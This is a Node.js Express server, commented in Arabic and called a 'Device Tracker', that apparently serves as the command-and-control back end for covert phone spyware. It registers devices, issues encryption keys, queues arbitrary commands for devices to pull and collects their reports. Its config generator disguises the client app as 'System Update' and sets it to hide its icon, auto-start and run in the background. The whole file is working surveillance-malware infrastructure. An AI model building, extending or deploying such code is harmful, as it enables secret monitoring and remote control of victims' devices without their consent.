// server/index.js
const express = require('express');
const cors = require('cors');
const crypto = require('crypto');

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json());

// قاعدة بيانات الأجهزة (في الإنتاج استخدم MongoDB)
const clientsDB = new Map();
const commandsQueue = new Map();

// توليد مفتاح تشفير
function generateEncryptionKey() {
    return crypto.randomBytes(32).toString('hex');
}

// تشفير البيانات
function encryptData(data, key) {
    try {
        const algorithm = 'aes-256-cbc';
        const keyBuffer = Buffer.from(key, 'hex');
        const iv = crypto.randomBytes(16);
        const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
        let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'base64');
        encrypted += cipher.final('base64');
        return iv.toString('hex') + ':' + encrypted;
    } catch (error) {
        return Buffer.from(JSON.stringify(data)).toString('base64');
    }
}

// فك التشفير
function decryptData(encryptedData, key) {
    try {
        const algorithm = 'aes-256-cbc';
        const keyBuffer = Buffer.from(key, 'hex');
        const parts = encryptedData.split(':');
        if (parts.length < 2) throw new Error('Invalid format');
        const iv = Buffer.from(parts[0], 'hex');
        const encrypted = parts.length === 3 ? parts[2] : parts[1];
        const decipher = crypto.createDecipheriv(algorithm, keyBuffer, iv);
        let decrypted = decipher.update(encrypted, 'base64', 'utf8');
        decrypted += decipher.final('utf8');
        return JSON.parse(decrypted);
    } catch (error) {
        try {
            return JSON.parse(Buffer.from(encryptedData, 'base64').toString('utf8'));
        } catch (e) {            return { commands: [] };
        }
    }
}

// 🔹 الصفحة الرئيسية
app.get('/', (req, res) => {
    res.json({ 
        success: true, 
        message: '🖥️ Device Tracker Server v2.0', 
        timestamp: new Date().toISOString()
    });
});

// 📝 تسجيل جهاز جديد
app.post('/api/clients/register', (req, res) => {
    try {
        const { clientId, deviceInfo, config } = req.body;
        if (!clientId) return res.status(400).json({ success: false, error: 'clientId is required' });
        
        const deviceId = 'device_' + crypto.randomUUID();
        const encryptionKey = generateEncryptionKey();
        
        const client = {
            deviceId, clientId, encryptionKey,
            deviceInfo: deviceInfo || {},
            config: config || {},
            registeredAt: new Date().toISOString(),
            status: 'active',
            lastCheckIn: null,
            lastReport: null
        };
        
        clientsDB.set(deviceId, client);
        commandsQueue.set(deviceId, []);
        
        console.log(`✅ New device: ${deviceId}`);
        res.json({ success: true, deviceId, encryptionKey, message: 'Registered' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🔄 Check-in من الجهاز
app.post('/api/clients/checkin', (req, res) => {
    try {
        const { deviceId, encryptedData } = req.body;
        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
        
        const client = clientsDB.get(deviceId);        if (!client) return res.status(404).json({ success: false, error: 'Device not found' });
        
        client.lastCheckIn = new Date().toISOString();
        client.status = 'active';
        clientsDB.set(deviceId, client);
        
        const pendingCommands = commandsQueue.get(deviceId) || [];
        if (pendingCommands.length > 0) commandsQueue.set(deviceId, []);
        
        const responseData = { commands: pendingCommands };
        const encryptedResponse = encryptData(responseData, client.encryptionKey);
        
        res.json({ success: true, encryptedData: encryptedResponse, timestamp: new Date().toISOString() });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📊 استقبال تقرير
app.post('/api/clients/report', (req, res) => {
    try {
        const { deviceId, commandId, result, status, data } = req.body;
        console.log(`📊 Report from ${deviceId}:`, { commandId, status });
        
        if (deviceId && clientsDB.has(deviceId)) {
            const client = clientsDB.get(deviceId);
            client.lastReport = new Date().toISOString();
            clientsDB.set(deviceId, client);
        }
        res.json({ success: true, message: 'Report received' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 📱 جلب الأجهزة
app.get('/api/devices', (req, res) => {
    try {
        const devices = Array.from(clientsDB.values()).map(c => ({
            deviceId: c.deviceId,
            clientId: c.clientId,
            deviceInfo: c.deviceInfo,
            status: c.status,
            registeredAt: c.registeredAt,
            lastCheckIn: c.lastCheckIn,
            isOnline: c.lastCheckIn && (Date.now() - new Date(c.lastCheckIn).getTime()) < 60000
        }));
        res.json({ success: true, count: devices.length, devices, timestamp: new Date().toISOString() });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });    }
});

// 📤 إرسال أمر
app.post('/api/devices/:deviceId/command', (req, res) => {
    try {
        const { deviceId } = req.params;
        const { type, action, payload } = req.body;
        if (!type && !action) return res.status(400).json({ success: false, error: 'Command required' });
        
        const client = clientsDB.get(deviceId);
        if (!client) return res.status(404).json({ success: false, error: 'Device not found' });
        
        const command = {
            id: 'cmd_' + crypto.randomUUID(),
            type: type || 'custom',
            action: action || null,
            payload: payload || {},
            createdAt: new Date().toISOString()
        };
        
        if (!commandsQueue.has(deviceId)) commandsQueue.set(deviceId, []);
        commandsQueue.get(deviceId).push(command);
        
        res.json({ success: true, command, message: 'Command queued' });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🎯 توليد Config
app.post('/api/config/generate', (req, res) => {
    try {
        const { serverUrl, clientId, appName = 'System Update', appId = 'com.system.service' } = req.body;
        if (!serverUrl) return res.status(400).json({ success: false, error: 'serverUrl required' });
        
        const configId = 'cfg_' + crypto.randomUUID();
        const apkConfig = {
            configId,
            generatedAt: new Date().toISOString(),
            app: { name: appName, id: appId, version: '2.0.0' },
            server: { url: serverUrl, checkInInterval: 30000, timeout: 10000, retries: 5 },
            behavior: { hideIcon: true, autoStart: true, runInBackground: true },
            security: { encryptData: true, verifySSL: true },
            custom: {}
        };
        
        res.json({
            success: true,
            configId,            config: apkConfig,
            htmlSnippet: `<script id="app-config" type="application/json">\n${JSON.stringify(apkConfig)}\n</script>`
        });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// 🚀 تشغيل الخادم
const PORT = parseInt(process.env.PORT || '3000', 10);
app.listen(PORT, '0.0.0.0', () => {
    console.log('════════════════════════════════════════');
    console.log('  🖥️  Device Tracker Server v2.0');
    console.log('════════════════════════════════════════');
    console.log(`  ✅ Running on port ${PORT}`);
    console.log(`  🌐 http://0.0.0.0:${PORT}`);
    console.log(`  📡 http://localhost:${PORT}`);
    console.log('════════════════════════════════════════');
});

module.exports = app;